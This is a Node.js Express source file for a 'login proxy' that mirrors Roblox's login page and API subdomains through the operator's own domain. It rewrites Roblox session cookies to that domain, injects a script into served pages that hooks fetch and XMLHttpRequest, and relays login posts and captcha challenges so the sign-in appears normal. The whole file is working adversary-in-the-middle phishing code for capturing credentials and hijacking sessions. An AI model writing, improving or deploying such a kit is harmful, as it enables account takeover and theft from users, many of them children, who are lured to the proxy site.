const express = require('express');
const { createProxyMiddleware, responseInterceptor } = require('http-proxy-middleware');
const https = require('https');
const http = require('http');

const app = express();

console.log('='.repeat(60));
console.log('🔒 PURE LOGIN PROXY - FIXED CHALLENGE HANDLING');
console.log('='.repeat(60));

// Shared HTTPS agent with keep-alive for connection pooling
const httpsAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000,
    rejectUnauthorized: true
});

const httpAgent = new http.Agent({
    keepAlive: true,
    keepAliveMsecs: 30000,
    maxSockets: 50,
    maxFreeSockets: 10,
    timeout: 30000
});

// Domain map
const SUBDOMAIN_MAP = {
    'auth-api':       'https://auth.roblox.com',
    'apis-api':       'https://apis.roblox.com',
    'api-api':        'https://api.roblox.com',
    'economy-api':    'https://economy.roblox.com',
    'users-api':      'https://users.roblox.com',
    'catalog-api':    'https://catalog.roblox.com',
    'games-api':      'https://games.roblox.com',
    'thumbnails-api': 'https://thumbnails.roblox.com',
    'ecsv2-api':      'https://ecsv2.roblox.com',
    'js-cdn':         'https://js.rbxcdn.com',
    'css-cdn':        'https://css.rbxcdn.com',
    'images-cdn':     'https://images.rbxcdn.com',
    'static-cdn':     'https://static.rbxcdn.com',
    'rbxcdn':         'https://www.rbxcdn.com',
    'content-cdn':    'https://content.roblox.com',
    'auth-token-service': 'https://auth-token-service.roblox.com',
    'hba-service':    'https://hba-service.roblox.com',
    'proof-of-work-service': 'https://proof-of-work-service.roblox.com',
    'account-security-service': 'https://account-security-service.roblox.com',
    'rotating-client-service': 'https://rotating-client-service.roblox.com',
    'guac-v2':        'https://guac-v2.roblox.com',
    'product-experimentation-platform': 'https://product-experimentation-platform.roblox.com',
    'otp-service':    'https://otp-service.roblox.com',
    'challenge':      'https://challenge.roblox.com',
};

const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36';

const CHALLENGE_HEADERS = [
    'rblx-challenge-id',
    'rblx-challenge-type',
    'rblx-challenge-metadata',
    'rblx-challenge-solution',
];

function rewriteCookies(cookies, host) {
    if (!cookies) return cookies;
    return cookies.map(cookie => {
        return cookie
            .replace(/Domain=\.?roblox\.com/gi, `Domain=.${host}`)
            .replace(/Domain=\.?rbxcdn\.com/gi, `Domain=.${host}`)
            .replace(/\bSecure\b/gi, 'Secure; SameSite=None');
    });
}

function setCorsHeaders(proxyRes, req, res) {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    
    // Set on response object (for direct responses)
    if (res) {
        res.set('Access-Control-Allow-Origin', origin);
        res.set('Access-Control-Allow-Credentials', 'true');
        res.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS, PATCH');
        res.set('Access-Control-Allow-Headers', [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
            ...CHALLENGE_HEADERS
        ].join(', '));
        res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));
    }
    
    // Set on proxy response (for proxied responses)
    if (proxyRes) {
        delete proxyRes.headers['access-control-allow-origin'];
        delete proxyRes.headers['access-control-allow-credentials'];
        delete proxyRes.headers['access-control-allow-methods'];
        delete proxyRes.headers['access-control-allow-headers'];
        delete proxyRes.headers['access-control-expose-headers'];

        proxyRes.headers['access-control-allow-origin'] = origin;
        proxyRes.headers['access-control-allow-credentials'] = 'true';
        proxyRes.headers['access-control-allow-methods'] = 'GET, POST, PUT, DELETE, OPTIONS, PATCH';
        proxyRes.headers['access-control-allow-headers'] = [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
            ...CHALLENGE_HEADERS
        ].join(', ');
        proxyRes.headers['access-control-expose-headers'] = ['x-csrf-token', ...CHALLENGE_HEADERS].join(', ');
    }
}

function isChallengeResponse(body) {
    try {
        const parsed = JSON.parse(body);
        return parsed?.errors?.[0]?.code === 0 &&
               parsed?.errors?.[0]?.message?.toLowerCase().includes('challenge');
    } catch (_) { return false; }
}

function getDeviceId(req) {
    const cookies = req.headers.cookie || '';
    const match = cookies.match(/rbx-device-id=([^;]+)/);
    if (match) return match[1];
    return Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('');
}

async function doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, extraHeaders, maxRetries = 2) {
    let lastError;
    for (let i = 0; i <= maxRetries; i++) {
        try {
            return await doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders);
        } catch (err) {
            lastError = err;
            if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ECONNREFUSED') {
                console.log(`   Retry ${i + 1}/${maxRetries} after ${err.code}...`);
                await new Promise(r => setTimeout(r, 500 * (i + 1)));
                continue;
            }
            throw err;
        }
    }
    throw lastError;
}

function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
    return new Promise((resolve, reject) => {
        const bodyBuf = Buffer.from(bodyStr, 'utf8');

        const headers = {
            'Content-Type':    'application/json;charset=UTF-8',
            'Content-Length':  bodyBuf.length,
            'Accept':          'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin':          'https://www.roblox.com',
            'Referer':         'https://www.roblox.com/login',
            'User-Agent':      ua || BROWSER_UA,
            'Connection':      'keep-alive',
        };

        const forwardHeaders = [
            'rbx-device-id', 'rbxdeviceid', 'x-bound-auth-token',
            ...CHALLENGE_HEADERS
        ];
        for (const h of forwardHeaders) {
            if (extraHeaders[h]) headers[h] = extraHeaders[h];
        }

        if (cookieHeader) headers['Cookie'] = cookieHeader;
        if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;

        const hasChallengeSolution = !!extraHeaders['rblx-challenge-id'];
        console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Challenge: ${hasChallengeSolution ? 'YES' : 'NO'}`);

        const options = {
            hostname: 'auth.roblox.com',
            path:     '/v2/login',
            method:   'POST',
            headers,
            agent:    httpsAgent,
        };

        const reqOut = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({
                status:  res.statusCode,
                headers: res.headers,
                body:    data,
            }));
        });

        reqOut.on('error', reject);
        reqOut.write(bodyBuf);
        reqOut.end();
    });
}

// =========================
// LOGIN HANDLER - Fixed challenge forwarding
// =========================
app.use('/auth-api/v2/login', express.json({ type: '*/*' }), async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const host = req.headers.host || 'localhost';
    const ua = req.headers['user-agent'] || BROWSER_UA;
    const incomingCookies = req.headers['cookie'] || '';
    const origin = req.headers['origin'] || `https://${host}`;
    const deviceId = getDeviceId(req);

    const hasSolution = !!req.headers['rblx-challenge-id'];
    console.log(`🔑 LOGIN | Challenge from browser: ${hasSolution ? 'YES' : 'NO'}`);

    try {
        const bodyStr = JSON.stringify(req.body);

        // Step 1: Get CSRF token
        const first = await doLoginRequestWithRetry(bodyStr, incomingCookies, null, ua, req.headers);
        console.log(`   Step 1: ${first.status} | CSRF: ${first.headers['x-csrf-token'] ? 'YES' : 'NO'}`);

        if (!first.headers['x-csrf-token']) {
            // No CSRF token, return first response directly
            return sendDirectResponse(res, first, host, origin, deviceId);
        }

        const csrfToken = first.headers['x-csrf-token'];
        let cookieHeader = incomingCookies;
        if (first.headers['set-cookie']) {
            const extra = first.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
        }

        // Step 2: Login with CSRF token
        const second = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken, ua, req.headers);
        console.log(`   Step 2: ${second.status}`);

        // Handle challenge required
        if (second.status === 403 && isChallengeResponse(second.body)) {
            console.log('   🧩 Arkose challenge required - forwarding to browser');
            return sendDirectResponse(res, second, host, origin, deviceId);
        }

        // Handle token rotation
        let finalResponse = second;
        if (second.status === 403 && second.headers['x-csrf-token'] && second.headers['x-csrf-token'] !== csrfToken) {
            const csrfToken2 = second.headers['x-csrf-token'];
            console.log(`   Token rotated, retrying...`);

            if (second.headers['set-cookie']) {
                const extra = second.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                cookieHeader = cookieHeader ? `${cookieHeader}; ${extra}` : extra;
            }

            const third = await doLoginRequestWithRetry(bodyStr, cookieHeader, csrfToken2, ua, req.headers);
            console.log(`   Step 3: ${third.status}`);
            finalResponse = third;
        }

        if (finalResponse.status === 200) {
            console.log('✅ LOGIN SUCCESS');
        } else {
            console.log(`❌ LOGIN FAILED: ${finalResponse.status}`);
        }

        sendDirectResponse(res, finalResponse, host, origin, deviceId);

    } catch (err) {
        console.error('[login] Error:', err.message);
        res.status(502).json({ error: 'Proxy error', message: err.message });
    }
});

// Send response directly with all headers properly set
function sendDirectResponse(res, response, host, origin, deviceId) {
    const status = response.status;
    const body = response.body;
    const responseHeaders = response.headers;

    // Set CORS headers
    res.set('Access-Control-Allow-Origin', origin);
    res.set('Access-Control-Allow-Credentials', 'true');
    res.set('Access-Control-Expose-Headers', ['x-csrf-token', ...CHALLENGE_HEADERS].join(', '));

    // Forward challenge headers (CRITICAL for captcha to work)
    for (const h of CHALLENGE_HEADERS) {
        if (responseHeaders[h]) {
            res.set(h, responseHeaders[h]);
            console.log(`   📤 Forwarding header: ${h}`);
        }
    }

    // Forward CSRF token
    if (responseHeaders['x-csrf-token']) {
        res.set('X-CSRF-TOKEN', responseHeaders['x-csrf-token']);
    }

    // Handle cookies
    const cookies = responseHeaders['set-cookie'];
    let allCookies = rewriteCookies(cookies, host) || [];
    
    // Add device ID cookie
    if (deviceId) {
        allCookies.push(`rbx-device-id=${deviceId}; Domain=.${host}; Path=/; Secure; SameSite=None`);
    }
    
    if (allCookies.length > 0) {
        res.set('Set-Cookie', allCookies);
    }

    res.set('Content-Type', 'application/json');
    res.status(status).send(body);
}

function buildInjectedScript(host) {
    const domainEntries = Object.entries(SUBDOMAIN_MAP)
        .map(([prefix, target]) => `[${JSON.stringify(target)}, ${JSON.stringify(`https://${host}/${prefix}`)}]`)
        .join(',');

    return `<script>
(function() {
    var PROXY_HOST = ${JSON.stringify(`https://${host}`)};
    var DOMAIN_MAP = [${domainEntries},
        ["https://www.roblox.com", PROXY_HOST],
        ["http://www.roblox.com", PROXY_HOST],
        ["https://roblox.com", PROXY_HOST],
        ["http://roblox.com", PROXY_HOST]
    ];
    function rewriteUrl(url) {
        if (!url || typeof url !== 'string') return url;
        for (var i = 0; i < DOMAIN_MAP.length; i++) {
            var from = DOMAIN_MAP[i][0], to = DOMAIN_MAP[i][1];
            if (url.indexOf(from) === 0) return to + url.slice(from.length);
        }
        return url;
    }
    var _fetch = window.fetch;
    window.fetch = function(resource, init) {
        if (typeof resource === 'string') resource = rewriteUrl(resource);
        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
        init = init || {};
        init.credentials = 'include';
        return _fetch.call(this, resource, init);
    };
    var _open = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
        var args = Array.prototype.slice.call(arguments);
        args[1] = rewriteUrl(url);
        return _open.apply(this, args);
    };
    var _send = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
        this.withCredentials = true;
        return _send.apply(this, arguments);
    };
})();
</script>`;
}

function escapeRegex(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function rewriteUrls(body, host) {
    let result = body;
    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
        const domain = target.replace(/^https?:/, '');
        result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
        result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
    }
    result = result.replace(/https?:\/\/www\.roblox\.com/g, `https://${host}`);
    result = result.replace(/\/\/www\.roblox\.com/g, `//${host}`);
    result = result.replace(/https?:\/\/roblox\.com/g, `https://${host}`);
    return result;
}

app.use((req, res, next) => {
    const start = Date.now();
    res.on('finish', () => {
        const ms = Date.now() - start;
        if (req.path !== '/www/e.png' && req.path !== '/pe') {
            console.log(`[${new Date().toISOString()}] ${req.method} ${req.path} → ${res.statusCode} (${ms}ms)`);
        }
    });
    next();
});

app.options('*', (req, res) => {
    const origin = req.headers['origin'] || `https://${req.headers.host}`;
    res.set({
        'access-control-allow-origin': origin,
        'access-control-allow-credentials': 'true',
        'access-control-allow-methods': 'GET, POST, PUT, DELETE, OPTIONS, PATCH',
        'access-control-allow-headers': [
            'Content-Type', 'x-csrf-token', 'Authorization', 'rbx-device-id', 'rbxdeviceid',
            'x-bound-auth-token', 'Accept', 'Accept-Language', 'Accept-Encoding',
            ...CHALLENGE_HEADERS
        ].join(', '),
        'access-control-max-age': '86400',
    });
    res.sendStatus(200);
});

function createRobloxProxy(prefix, target) {
    const agent = target.startsWith('https:') ? httpsAgent : httpAgent;
    
    return createProxyMiddleware({
        target,
        changeOrigin: true,
        secure: true,
        pathRewrite: { [`^/${prefix}`]: '' },
        proxyTimeout: 30000,
        timeout: 30000,
        agent,
        
        on: {
            proxyReq: (proxyReq, req) => {
                proxyReq.setHeader('origin', 'https://www.roblox.com');
                proxyReq.setHeader('referer', 'https://www.roblox.com/login');
                proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
                proxyReq.setHeader('accept', req.headers['accept'] || 'application/json, text/plain, */*');
                proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
                proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
                proxyReq.setHeader('connection', 'keep-alive');
                
                if (req.headers['x-csrf-token']) proxyReq.setHeader('x-csrf-token', req.headers['x-csrf-token']);
                if (req.headers['rbx-device-id']) proxyReq.setHeader('rbx-device-id', req.headers['rbx-device-id']);
                if (req.headers['rbxdeviceid']) proxyReq.setHeader('rbxdeviceid', req.headers['rbxdeviceid']);
                if (req.headers['x-bound-auth-token']) proxyReq.setHeader('x-bound-auth-token', req.headers['x-bound-auth-token']);
                
                for (const h of CHALLENGE_HEADERS) {
                    if (req.headers[h]) proxyReq.setHeader(h, req.headers[h]);
                }
            },

            proxyRes: (proxyRes, req) => {
                if (proxyRes.headers['set-cookie']) {
                    const host = req.headers.host || 'localhost';
                    proxyRes.headers['set-cookie'] = rewriteCookies(proxyRes.headers['set-cookie'], host);
                }
                setCorsHeaders(proxyRes, req);
            },

            error: (err, req, res) => {
                if (req.path === '/www/e.png' || req.path === '/pe') {
                    res.status(204).end();
                    return;
                }
                console.error(`[${prefix}] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
                if (!res.headersSent) {
                    res.status(502).json({ error: 'Proxy error', code: err.code });
                }
            }
        }
    });
}

// Register all API proxies
for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
    app.use(`/${prefix}`, createRobloxProxy(prefix, target));
}

app.use('/', createProxyMiddleware({
    target: 'https://www.roblox.com',
    changeOrigin: true,
    secure: true,
    selfHandleResponse: true,
    proxyTimeout: 30000,
    timeout: 30000,
    agent: httpsAgent,

    pathRewrite: (path) => (path === '/' ? '/login' : path),

    on: {
        proxyReq: (proxyReq, req) => {
            proxyReq.setHeader('user-agent', req.headers['user-agent'] || BROWSER_UA);
            proxyReq.setHeader('accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
            proxyReq.setHeader('accept-language', 'en-US,en;q=0.9');
            proxyReq.setHeader('accept-encoding', 'gzip, deflate, br');
            proxyReq.setHeader('connection', 'keep-alive');
        },

        proxyRes: responseInterceptor(async (buffer, proxyRes, req, res) => {
            const ct = proxyRes.headers['content-type'] || '';

            if (ct.includes('text/html')) {
                const host = req.headers.host;
                let body = buffer.toString('utf8');
                body = rewriteUrls(body, host);
                const script = buildInjectedScript(host);
                body = body.replace('<head', `<head>${script}`);
                return body;
            }
            return buffer;
        }),

        error: (err, req, res) => {
            console.error(`[main] ❌ ${req.method} ${req.path} | ${err.code}: ${err.message}`);
            if (!res.headersSent) {
                res.status(502).send('Proxy error');
            }
        }
    }
}));

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Proxy running on port ${PORT}`);
});
